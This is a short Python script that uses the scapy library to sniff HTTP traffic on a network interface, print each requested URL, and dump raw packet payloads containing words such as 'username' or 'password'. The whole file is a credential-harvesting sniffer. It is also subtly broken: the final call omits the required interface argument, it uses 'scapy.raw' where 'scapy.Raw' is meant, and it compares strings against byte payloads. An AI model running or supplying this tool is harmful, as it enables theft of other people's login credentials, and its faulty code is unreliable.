#python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].host + packet[http.HTTPRequest].path
        print(url)

        if packet.haslayer(scapy.raw):
            load = packet[scapy.raw].load
            keyword = ["username", "user", "password", "pass"]
            for keyword in keyword:
                if keyword in load:
                    print(load)
                    break

sniff()